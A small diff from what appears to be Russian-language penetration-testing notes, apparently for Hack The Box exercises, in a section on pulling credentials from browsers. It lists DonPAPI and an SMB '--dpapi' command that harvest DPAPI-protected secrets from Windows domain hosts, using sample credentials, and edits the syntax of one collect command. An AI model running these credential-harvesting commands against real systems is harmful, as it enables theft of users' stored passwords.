@@ -115,7 +115,7 @@
 
 		((получение кредов из браузеров))	mxc smb ss.banki.htb -u boss -p "password" -d banki.htb --dpapi			
   					pipx install git+https://github.com/login-securite/DonPAPI.git
-					donpapi collect target_list -u admin -p 'Password123!' -d domain.local -t ALL --fetch-pvk
+					donpapi collect -u admin -p 'Password123!' -d domain.local -t ALL {target_lists} (--fetch-pvk)
 					DonPAPI.py domain/user:passw0rd@target
 					donpapi gui
 
